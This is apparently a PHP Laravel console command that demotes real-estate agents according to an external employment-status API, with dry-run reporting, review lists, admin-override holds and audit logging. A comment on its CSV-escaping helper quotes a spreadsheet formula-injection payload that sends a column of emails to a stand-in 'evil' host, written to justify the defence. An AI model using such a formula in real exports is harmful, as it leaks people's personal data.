<?php

namespace App\Console\Commands;

use App\Console\Commands\Concerns\PacesLrCalls;
use App\Models\Agent;
use App\Services\Agent\AgentCachePurger;
use App\Services\LeuterioreRealty\LrApiService;
use App\Services\LeuterioreRealty\LrEmploymentRecorder;
use App\Support\LrAgentStatus;
use Illuminate\Console\Command;
use Illuminate\Support\Carbon;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Symfony\Component\Console\Output\OutputInterface;

/**
 * Demote FH agents to what Leuterio Realty says they are. The ONLY thing that
 * changes agents.status from LR's word; agents:sync-lr-status just records it.
 *
 * Demoting an agent pulls their listings off the public site, the directory and
 * the sitemap — across the whole roster that is a site-wide SEO event. So,
 * like agents:deactivate-dormant, it is a REPORT unless --force, and --force is
 * never blind:
 *
 *   --status=…    which LR statuses to apply, named every time (terminated and
 *                 resigned first; `inactive` is the big, debatable cohort).
 *   --from-csv=…  apply only the reviewed list (`--csv` prints the cohort in
 *                 that format), or --limit=N for a small batch (capped by
 *                 lr_status.max_unreviewed_batch: a limit alone takes agents
 *                 from the LIVE cohort, which can include agents the sync
 *                 recorded after anyone looked).
 *   --exclude=…   ids to hold back.
 *
 * The same options on a REPORT preview exactly the batch --force would apply.
 *
 * ─── Rules ──────────────────────────────────────────────────────────────────
 * - LR only ever moves an agent OUT of `active`. Never reactivates, and never
 *   rewrites one blocked status into another.
 * - Only role `agent`. Admins and secretaries also have agents rows, but a
 *   demoted admin's listings would vanish and a secretary would be locked out.
 * - Not found, errors, empty and unknown values never act.
 * - An admin's decision sticks. An agent is held when an admin set their status
 *   (the Agents-page dropdown) AFTER LR's value last changed — or at all, if LR
 *   has never changed since the sync first saw it. Same shape as
 *   RepairDormantAgentLockout: a rule that re-applied every run would undo an
 *   admin's reactivation and the admin could never win.
 * - Every demotion re-asks LR first. The sync's record can be days old.
 * - One agent failing never stops the run, and whatever WAS demoted is still
 *   purged and logged.
 *
 * Run it on the host with the code deployed everywhere: an old-code host does
 * not know `terminated` and would not block that agent.
 */
class ApplyLrAgentStatus extends Command
{
    use PacesLrCalls;

    protected $signature = 'agents:apply-lr-status
        {--force : Apply the changes. Without it the run only reports.}
        {--status= : LR statuses to apply, comma-separated (required with --force), e.g. terminated,resigned}
        {--from-csv= : Apply only the agent ids in this reviewed list (first column of the --csv report)}
        {--exclude= : Comma-separated agent ids to leave alone}
        {--limit= : Stop after this many agents}
        {--sleep-ms= : Pause between LR calls}
        {--csv : Print the candidate list as CSV on stdout (report only)}';

    protected $description = 'Demote agents LR says are inactive/resigned/terminated (reports only unless --force).';

    /** Per-agent cache purges above this many agents are collapsed to one directory purge. */
    private const PURGE_INDIVIDUALLY_UP_TO = 200;

    private const CSV_HEADER = ['agent_id', 'name', 'email', 'lr_status', 'lr_checked_at', 'last_online', 'public_listings', 'team_leader', 'admin_set'];

    public function handle(LrApiService $lr, LrEmploymentRecorder $recorder, AgentCachePurger $purger): int
    {
        // Console model auditing is off by default (config('audit.console')),
        // and owen-it reads it once, when Agent first boots — so this has to be
        // the first thing the command does. Without it the status change below
        // would leave NO audit row, and the admin-override rule and the history
        // both read audits.
        config(['audit.console' => true]);

        $force = (bool) $this->option('force');

        if ($force && $this->option('csv')) {
            return $this->refuse('--csv is for the report; it can’t be combined with --force.');
        }

        $named = collect(explode(',', (string) $this->option('status')))
            ->map(fn ($s) => LrAgentStatus::normalize($s))
            ->filter()
            ->unique()
            ->values();
        $unknown = $named->reject(fn ($s) => in_array($s, LrAgentStatus::lrStatuses(), true));
        if ($unknown->isNotEmpty()) {
            return $this->refuse("Unknown --status '{$unknown->first()}'. Use any of: ".implode(', ', LrAgentStatus::lrStatuses()).'.');
        }

        $statuses = $named->isNotEmpty() ? $named->all() : LrAgentStatus::lrStatuses();

        $limit = $this->wholeOption('limit');
        $sleepMs = $this->wholeOption('sleep-ms');
        if ($limit === false || $sleepMs === false) {
            return $this->refuse('--limit and --sleep-ms must be whole numbers.');
        }
        $limit ??= 0;
        $exclude = $this->ids((string) $this->option('exclude'));

        $reviewed = null;
        $path = (string) $this->option('from-csv');
        if ($path !== '') {
            $reviewed = $this->readReviewedIds($path);
            if ($reviewed === null || $reviewed === []) {
                return $this->refuse("Can’t use the reviewed list given to --from-csv ({$path}): it is missing, unreadable, or has no agent ids.");
            }
        }

        if ($force) {
            if ($named->isEmpty()) {
                return $this->refuse('--force needs --status=… naming the LR statuses to apply (e.g. --status=terminated,resigned).');
            }
            if ($reviewed === null && $limit === 0) {
                return $this->refuse('--force needs the reviewed list (--from-csv=…) or a batch size (--limit=…).');
            }

            $max = (int) config('lr_status.max_unreviewed_batch', 50);
            if ($reviewed === null && $limit > $max) {
                return $this->refuse("--limit above {$max} needs the reviewed list (--from-csv=…): a batch that big should be one somebody has looked at.");
            }
        }

        $candidates = $this->candidates($statuses);
        [$targets, $held, $notCandidates] = $this->selectTargets($candidates, $reviewed, $exclude, $limit);

        if (! $force) {
            return $this->report($candidates, $statuses, $targets, $notCandidates, $reviewed !== null || $exclude !== [] || $limit > 0);
        }

        return $this->apply($targets, $held, $notCandidates, $lr, $recorder, $purger, $sleepMs ?? max(0, (int) config('lr_status.sleep_ms', 1000)));
    }

    // ── choosing who ───────────────────────────────────────────────────────

    /**
     * The batch --force would apply: the candidates an admin hasn't decided
     * about, narrowed to the reviewed list, minus --exclude, capped by --limit.
     * Held agents are dropped BEFORE the cap, so they never use up a slot.
     *
     * @param  list<int>|null  $reviewed
     * @param  list<int>  $exclude
     * @return array{0: Collection, 1: int, 2: int} the batch, how many are held, how many reviewed ids aren't candidates
     */
    private function selectTargets(Collection $candidates, ?array $reviewed, array $exclude, int $limit): array
    {
        $held = $candidates->where('held', true)->count();
        $targets = $candidates->reject(fn ($row) => $row->held);

        $notCandidates = 0;
        if ($reviewed !== null) {
            $notCandidates = count(array_diff($reviewed, $candidates->pluck('id')->map(fn ($id) => (int) $id)->all()));
            $targets = $targets->filter(fn ($row) => in_array((int) $row->id, $reviewed, true));
        }

        $targets = $targets->reject(fn ($row) => in_array((int) $row->id, $exclude, true))->values();

        if ($limit > 0) {
            $targets = $targets->take($limit)->values();
        }

        return [$targets, $held, $notCandidates];
    }

    // ── the report ─────────────────────────────────────────────────────────

    /**
     * @param  bool  $narrowed  --from-csv / --exclude / --limit were given: preview that batch
     */
    private function report(Collection $candidates, array $statuses, Collection $targets, int $notCandidates, bool $narrowed): int
    {
        $rows = $narrowed ? $targets : $candidates;

        if ($this->option('csv')) {
            $this->csvLine(self::CSV_HEADER);
            foreach ($rows as $row) {
                $this->csvLine([
                    $row->id,
                    trim("{$row->first_name} {$row->last_name}"),
                    $row->login_email,
                    $row->lr_status,
                    $row->checked_at,
                    $row->last_online_at ?? '',
                    $row->public_listings,
                    $row->team_leader ? 'yes' : 'no',
                    $row->held ? 'yes' : 'no',
                ]);
            }

            return self::SUCCESS;
        }

        $byStatus = $candidates->groupBy('lr_status')->map->count();
        $held = $candidates->where('held', true)->count();
        $ignored = $this->ignored();

        $this->line(sprintf('%d agent%s FH shows as active that LR says otherwise:', $candidates->count(), $candidates->count() === 1 ? '' : 's'));
        foreach ($statuses as $status) {
            $this->line(sprintf('  %-12s %d', $status, $byStatus[$status] ?? 0));
        }
        $this->line(sprintf('  Held — an admin has set their status: %d', $held));

        if ($narrowed) {
            $batch = $targets->groupBy('lr_status')->map->count();
            $this->newLine();
            $this->line(sprintf(
                'This batch — what --force would apply with these options: %d agent%s%s.',
                $targets->count(),
                $targets->count() === 1 ? '' : 's',
                $batch->isEmpty() ? '' : ' ('.$batch->map(fn ($n, $s) => "{$s} {$n}")->implode(', ').')',
            ));
            if ($notCandidates > 0) {
                $this->line(sprintf('  %d id%s from the reviewed list %s not a candidate and would be ignored.', $notCandidates, $notCandidates === 1 ? '' : 's', $notCandidates === 1 ? 'is' : 'are'));
            }
        }

        $this->newLine();
        $this->line('Ignored — never applied:');
        $this->line(sprintf('  LR active again, FH has them switched off  %d', $ignored['active_again']));
        $this->line(sprintf('  not found in LR                            %d', $ignored['not_found']));
        $this->line(sprintf('  lookup failed (retried daily)              %d', $ignored['failed']));
        $this->line(sprintf('  not asked yet                              %d', $ignored['not_asked']));
        $this->line(sprintf(
            '  unrecognised LR value                      %d%s',
            $ignored['unrecognised']->sum(),
            $ignored['unrecognised']->isEmpty() ? '' : '  ('.$ignored['unrecognised']->map(fn ($n, $s) => "{$s} ×{$n}")->implode(', ').')',
        ));

        // A sample of addresses is for a person at a terminal. The scheduled run
        // is not interactive, and its output goes to the scheduler's log on ECS —
        // agents' email addresses don't belong there (--csv is the explicit way to get them).
        if ($rows->isNotEmpty() && $this->input->isInteractive()) {
            $this->newLine();
            $this->table(
                ['Agent', 'Email', 'LR status', 'Checked', 'Last online', 'Held'],
                $rows->take(15)->map(fn ($r) => [
                    $r->id,
                    $r->login_email,
                    $r->lr_status,
                    Carbon::parse($r->checked_at)->diffForHumans(),
                    $r->last_online_at ? Carbon::parse($r->last_online_at)->toDateString() : 'never',
                    $r->held ? 'yes' : '',
                ])->all(),
            );
            if ($rows->count() > 15) {
                $this->line(sprintf('… and %d more.', $rows->count() - 15));
            }
        }

        $this->newLine();
        $this->warn('Dry run — nothing was changed.');
        $this->line('Demoting hides an agent’s listings from the public site, the directory and the sitemap.');
        $this->line('Review the full list (--csv prints it), delete the rows you want to keep, then apply that list:');
        $this->line('  agents:apply-lr-status --force --status=terminated,resigned --from-csv=reviewed.csv');

        Log::info('LR status apply (report)', [
            'candidates' => $candidates->count(),
            'by_status' => $byStatus->all(),
            'held' => $held,
            'active_again' => $ignored['active_again'],
            'not_found' => $ignored['not_found'],
            'failed' => $ignored['failed'],
            'not_asked' => $ignored['not_asked'],
            'unrecognised' => $ignored['unrecognised']->all(),
        ]);

        return self::SUCCESS;
    }

    // ── applying ───────────────────────────────────────────────────────────

    private function apply(Collection $targets, int $held, int $notCandidates, LrApiService $lr, LrEmploymentRecorder $recorder, AgentCachePurger $purger, int $sleepMs): int
    {
        $this->line("Applying to {$targets->count()} agent(s), asking LR again before each…");

        // A long paced run can outlast the default limit.
        @set_time_limit(0);

        $demoted = collect();
        $skipped = ['changed' => 0, 'failed' => 0, 'not_found' => 0, 'not_eligible' => 0, 'held' => 0];
        $throttledInARow = 0;

        try {
            foreach ($targets as $row) {
                try {
                    $key = LrEmploymentRecorder::lookupKey($row->lr_email, $row->login_email);
                    if ($key === null) {
                        $skipped['failed']++;

                        continue;
                    }

                    $lookup = $lr->lookupAgentStatus($key);

                    if ($lookup['result'] === LrApiService::LOOKUP_ERROR && $lookup['http_status'] === 429) {
                        // Throttled — says nothing about this agent, so it is not recorded.
                        $skipped['failed']++;
                        if (++$throttledInARow >= 3) {
                            $this->warn('LR is rate-limiting us — stopping; run again to continue.');
                            break;
                        }
                        $this->backOff();

                        continue;
                    }
                    $throttledInARow = 0;

                    // Keep the fresh answer, whatever it is, so the next report is current.
                    $recorder->record((int) $row->id, $lookup);

                    if ($lookup['result'] === LrApiService::LOOKUP_ERROR) {
                        $skipped['failed']++;
                    } elseif ($lookup['result'] === LrApiService::LOOKUP_NOT_FOUND) {
                        $skipped['not_found']++;
                    } elseif ($lookup['status'] !== $row->lr_status) {
                        $skipped['changed']++;
                    } else {
                        $outcome = $this->demote((int) $row->id, (string) $row->lr_status);
                        if ($outcome === 'demoted') {
                            $demoted->push($row);
                        } else {
                            $skipped[$outcome]++;
                        }
                    }

                    $this->giveWayWhenLow($lookup['remaining']);
                } catch (\Throwable $e) {
                    // One agent failing must not stop the rest, nor leave what was
                    // already demoted un-purged and unlogged.
                    $skipped['failed']++;
                    Log::warning('LR status apply: skipped an agent after an error', [
                        'agent_id' => $row->id,
                        'error' => substr($e->getMessage(), 0, 300),
                    ]);
                }

                $this->pause($sleepMs * 1000);
            }
        } finally {
            $this->purge($demoted, $purger);

            Log::info('LR status apply (forced)', [
                'demoted' => $demoted->count(),
                'by_status' => $demoted->groupBy('lr_status')->map->count()->all(),
                'held' => $held + $skipped['held'],
                'skipped' => $skipped,
            ]);
        }

        $byStatus = $demoted->groupBy('lr_status')->map->count();
        $this->newLine();
        $this->info(sprintf(
            'Demoted %d agent%s%s.',
            $demoted->count(),
            $demoted->count() === 1 ? '' : 's',
            $byStatus->isEmpty() ? '' : ' ('.$byStatus->map(fn ($n, $s) => "{$s} {$n}")->implode(', ').')',
        ));
        $this->line(sprintf(
            'Skipped — held by an admin: %d · LR changed: %d · lookup failed: %d · not found: %d · no longer eligible: %d.',
            $held + $skipped['held'], $skipped['changed'], $skipped['failed'], $skipped['not_found'], $skipped['not_eligible'],
        ));
        if ($notCandidates > 0) {
            $this->line(sprintf('%d id%s from the reviewed list %s not a candidate and was ignored.', $notCandidates, $notCandidates === 1 ? '' : 's', $notCandidates === 1 ? 'is' : 'are'));
        }

        return self::SUCCESS;
    }

    /**
     * One agent's demotion, inside a transaction with the row locked, so an
     * admin (or the dormancy sweep) changing the same agent while this run
     * waits on LR is not overwritten. Re-checks everything that made them a
     * candidate — they are still an active agent, and no admin has decided.
     *
     * @return 'demoted'|'not_eligible'|'held'
     */
    private function demote(int $agentId, string $lrStatus): string
    {
        $to = LrAgentStatus::demotesTo($lrStatus);

        return DB::transaction(function () use ($agentId, $lrStatus, $to) {
            $agent = Agent::query()->lockForUpdate()->find($agentId);

            if (! $agent || $agent->status !== 'active' || $to === null) {
                return 'not_eligible';
            }

            // Promoted to admin / secretary while this run waited on LR: they are
            // no longer someone LR may demote.
            $role = DB::table('users')
                ->join('roles', 'roles.id', '=', 'users.role_id')
                ->where('users.id', $agent->user_id)
                ->value('roles.name');
            if ($role !== 'agent') {
                return 'not_eligible';
            }

            if ($this->heldByAdmin($agentId, $agent->lr_employment_changed_at)) {
                return 'held';
            }

            // Through the model, so it is audited: a readable label and its own
            // source, like the dormancy sweep's `auto_dormant`.
            $agent->auditDescription = "LR status: {$lrStatus} → {$to}";
            $agent->auditSource = 'lr_sync';
            $agent->update(['status' => $to]);

            return 'demoted';
        });
    }

    /** An admin set this agent's status after LR's value last changed — or at all, when it never has. */
    private function heldByAdmin(int $agentId, ?Carbon $lrChangedAt): bool
    {
        $audits = DB::table('audits')
            ->where('auditable_type', Agent::class)
            ->where('auditable_id', $agentId)
            ->whereIn('source', Agent::ADMIN_STATUS_SOURCES);

        if ($lrChangedAt !== null) {
            $audits->where('created_at', '>', $lrChangedAt);
        }

        return $audits->exists();
    }

    private function purge(Collection $demoted, AgentCachePurger $purger): void
    {
        if ($demoted->isEmpty()) {
            return;
        }

        if ($demoted->count() <= self::PURGE_INDIVIDUALLY_UP_TO) {
            $demoted->each(fn ($row) => $purger->purgeAgent((int) $row->id, true));

            return;
        }

        // One POST per 50 tags makes a per-agent purge of hundreds of agents
        // that many sequential HTTP calls; purging the directory is what has to
        // be immediate, and each agent's own page refreshes on its normal ISR window.
        $purger->purgeDirectory();
    }

    // ── candidates ─────────────────────────────────────────────────────────

    /**
     * FH-active agents (role `agent`, not removed) whose recorded LR status is
     * one of $statuses, with what a reviewer needs to decide.
     *
     * @param  list<string>  $statuses
     * @return Collection<int, object>
     */
    private function candidates(array $statuses): Collection
    {
        $rows = $this->agents()
            ->where('agents.status', 'active')
            ->where('agents.lr_employment_lookup', LrApiService::LOOKUP_FOUND)
            ->whereIn('agents.lr_employment_status', $statuses)
            ->orderBy('agents.id')
            ->get([
                'agents.id', 'agents.first_name', 'agents.last_name', 'agents.lr_email',
                'agents.lr_employment_status as lr_status',
                'agents.lr_employment_checked_at as checked_at',
                'agents.lr_employment_changed_at as changed_at',
                'users.email as login_email', 'users.last_online_at',
            ]);

        if ($rows->isEmpty()) {
            return $rows;
        }

        $ids = $rows->pluck('id')->all();

        $lastAdminSet = DB::table('audits')
            ->where('auditable_type', Agent::class)
            ->whereIn('source', Agent::ADMIN_STATUS_SOURCES)
            ->whereIn('auditable_id', $ids)
            ->selectRaw('auditable_id, MAX(created_at) as last_at')
            ->groupBy('auditable_id')
            ->pluck('last_at', 'auditable_id');

        // The listings that would leave the public site: public and not flagged.
        $publicListings = DB::table('listings')
            ->whereIn('agent_id', $ids)
            ->where('visibility', 'public')
            ->whereNull('deleted_at')
            ->where(fn ($q) => $q->whereNull('verification_status')->orWhere('verification_status', '!=', 'flagged'))
            ->selectRaw('agent_id, COUNT(*) as n')
            ->groupBy('agent_id')
            ->pluck('n', 'agent_id');

        $leaders = DB::table('team_agents')
            ->whereIn('agent_id', $ids)
            ->where('is_leader', true)
            ->where('status', 'active')
            ->pluck('agent_id')
            ->flip();

        return $rows->map(function ($row) use ($lastAdminSet, $publicListings, $leaders) {
            $last = $lastAdminSet[$row->id] ?? null;
            $row->held = $last !== null
                && ($row->changed_at === null || Carbon::parse($last)->gt(Carbon::parse($row->changed_at)));
            $row->public_listings = (int) ($publicListings[$row->id] ?? 0);
            $row->team_leader = $leaders->has($row->id);

            return $row;
        });
    }

    /**
     * What the report counts but never applies.
     *
     * @return array{active_again: int, not_found: int, failed: int, not_asked: int, unrecognised: Collection<string, int>}
     */
    private function ignored(): array
    {
        return [
            'active_again' => $this->agents()->where('agents.status', '!=', 'active')
                ->where('agents.lr_employment_lookup', LrApiService::LOOKUP_FOUND)
                ->where('agents.lr_employment_status', 'active')->count(),
            'not_found' => $this->agents()->where('agents.lr_employment_lookup', LrApiService::LOOKUP_NOT_FOUND)->count(),
            'failed' => $this->agents()->where('agents.lr_employment_lookup', LrApiService::LOOKUP_ERROR)->count(),
            'not_asked' => $this->agents()->whereNull('agents.lr_employment_lookup')->count(),
            'unrecognised' => $this->agents()
                ->where('agents.lr_employment_lookup', LrApiService::LOOKUP_FOUND)
                ->selectRaw('agents.lr_employment_status as s, COUNT(*) as n')
                ->groupBy('agents.lr_employment_status')
                ->pluck('n', 's')
                ->filter(fn ($n, $status) => LrAgentStatus::isUnmapped((string) $status)),
        ];
    }

    /** Role `agent` only, removed agents excluded (the Agent soft-delete scope is applied by toBase()). */
    private function agents(): \Illuminate\Database\Query\Builder
    {
        return Agent::query()
            ->join('users', 'users.id', '=', 'agents.user_id')
            ->join('roles', 'roles.id', '=', 'users.role_id')
            ->where('roles.name', 'agent')
            ->toBase();
    }

    // ── small helpers ──────────────────────────────────────────────────────

    /** @return list<int> */
    private function ids(string $list): array
    {
        return collect(explode(',', $list))
            ->map(fn ($id) => trim($id))
            ->filter(fn ($id) => ctype_digit($id))
            ->map(fn ($id) => (int) $id)
            ->unique()
            ->values()
            ->all();
    }

    /**
     * The agent ids in a reviewed CSV: the first column; the header and blank
     * lines are skipped. Null when the file can't be read.
     *
     * @return list<int>|null
     */
    private function readReviewedIds(string $path): ?array
    {
        if (! is_file($path) || ! is_readable($path) || ($handle = fopen($path, 'r')) === false) {
            return null;
        }

        $ids = [];
        while (($row = fgetcsv($handle, null, ',', '"', '')) !== false) {
            $first = trim((string) ($row[0] ?? ''));
            if (ctype_digit($first)) {
                $ids[] = (int) $first;
            }
        }
        fclose($handle);

        return array_values(array_unique($ids));
    }

    /** One CSV row on stdout, raw so a name like "<x>" isn't read as console markup. */
    private function csvLine(array $fields): void
    {
        $memory = fopen('php://memory', 'r+');
        fputcsv($memory, array_map(fn ($field) => is_string($field) ? $this->spreadsheetSafe($field) : $field, $fields), ',', '"', '');
        rewind($memory);
        $this->output->writeln(rtrim((string) stream_get_contents($memory), "\r\n"), OutputInterface::OUTPUT_RAW);
        fclose($memory);
    }

    /**
     * Names and emails here are typed by agents, and the reviewers open this in
     * Excel or Sheets — which runs a cell starting with = + - @ (or a tab or CR)
     * as a formula: =IMPORTXML("http://evil/?"&C2:C400,"//a") would send the whole
     * cohort's emails out. A leading apostrophe makes it plain text (OWASP's
     * advice). The id column is an integer and --from-csv reads only that column,
     * so the round trip is unaffected.
     */
    private function spreadsheetSafe(string $value): string
    {
        return $value !== '' && strpbrk($value[0], "=+-@\t\r") !== false ? "'".$value : $value;
    }
}
